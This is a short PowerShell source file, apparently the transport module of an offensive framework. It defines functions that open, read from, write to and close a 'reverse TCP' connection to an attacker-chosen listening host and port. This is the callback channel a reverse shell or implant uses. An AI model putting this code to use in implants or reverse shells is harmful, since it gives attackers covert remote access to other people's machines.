
function Transport-ReverseTcp-Open {
    <#
        .SYNOPSIS
        connects to a tcp listening handler
        .PARAMETER LHost
        ip adress of the listenig host
        .PARAMETER LPort
        port of the listenig host
    #>
    param(
        [Parameter(Mandatory=$true)]
        [String]
        $LHost,

        [Parameter(Mandatory=$true)]
        [String]
        $LPort
    )

    $tcpConnection = New-Object System.Net.Sockets.TcpClient($LHost, $LPort)
    $tcpStream = $tcpConnection.GetStream()
    $reader = New-Object System.IO.StreamReader($tcpStream)
    $writer = New-Object System.IO.StreamWriter($tcpStream)
    $writer.AutoFlush = $true

    return New-Object -TypeName PSObject -Property @{
       'tcpConnection' = $tcpConnection
       'reader' = $reader
       'writer' = $writer
	   'tcpStream' = $tcpStream
    }

}

function Transport-ReverseTcp-Close([PSObject] $obj) {
    $obj.reader.Close()
    $obj.writer.Close()
    $obj.tcpConnection.Close()
}


function Transport-ReverseTcp-Receive([PSObject] $obj, [Int32] $bytestoread) {
    #if ($obj.tcpConnection.Connected -and $obj.tcpStream.DataAvailable) {
	$numb = 0
	$buffer = New-Object char[]($bytestoread)
	while ($numb -lt $bytestoread) {
		$numb += $obj.reader.Read($buffer, $numb, $bytestoread-$numb)
	}		
	return $buffer
    #} else {
    #    Write-Output "ERROR when receiving"
    #}
}

function Transport-ReverseTcp-Send([PSObject] $obj, $data) {
    if ($obj.tcpConnection.Connected) {
        $obj.writer.Write($data)
    } else {
        Write-Output "ERROR when sending"
    }
}

